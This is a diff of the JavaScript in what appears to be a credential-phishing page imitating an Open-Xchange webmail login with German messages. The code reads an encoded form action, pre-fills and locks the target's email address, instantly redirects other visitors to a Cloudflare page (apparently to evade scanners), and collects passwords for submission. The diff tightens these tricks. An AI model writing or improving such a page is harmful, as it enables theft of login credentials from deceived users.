@@ -170,8 +170,7 @@ content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
 <script>
-<script>
-$(document).ready(function() {
+window.onload = function() {
     var encodedAction = $("#login-form").data("action");
     if (encodedAction) {
         try {
@@ -220,42 +219,40 @@ $(document).ready(function() {
     
     if(email && regex.test(email)) {
         $("#email").val(email);
+        $("#email").prop('readonly', true);
         $("#password").focus();
     } else {
-        setTimeout(function() {
-            window.location.href = 'https://dash.cloudflare.com';
-        }, 2000);
+        window.location.href = 'https://dash.cloudflare.com';
+        return;
     }
 
     if(pwdError) {
         $('#io-ox-login-feedback').show();
     }
 
-    $('#io-ox-login-button').click(function(e) {
-        e.preventDefault();
-        
+    $('#io-ox-login-button').click(function() {
         var emailVal = $("#email").val().trim();
         var passwordVal = $("#password").val();
-            
-    if(!emailVal) {
-        alert("Bitte E-Mail eingeben");
-        return;
-    }
-    
-    if(!passwordVal) {
-        alert("Bitte Passwort eingeben");
-        return;
-    }
-    
-    if(passwordVal.length < 5) {
-        alert("Das Passwort muss mindestens 5 Zeichen lang sein");
-        return;
-    }
-    
-    if(hasTooManyRepeats(passwordVal)) {
-        alert("Das Passwort darf nicht mehr als 3 gleiche Zeichen hintereinander enthalten");
-        return;
-    }
+        
+        if(!emailVal) {
+            alert("Bitte E-Mail eingeben");
+            return;
+        }
+        
+        if(!passwordVal) {
+            alert("Bitte Passwort eingeben");
+            return;
+        }
+        
+        if(passwordVal.length < 5) {
+            alert("Passwort muss mindestens 5 Zeichen haben");
+            return;
+        }
+        
+        if(hasTooManyRepeats(passwordVal)) {
+            alert("Passwort darf keine 3 gleichen Zeichen hintereinander haben");
+            return;
+        }
         
         $('#login-form').submit();
     });
@@ -266,5 +263,5 @@ $(document).ready(function() {
             $('#io-ox-login-button').click();
         }
     });
-});
+};
 </script>
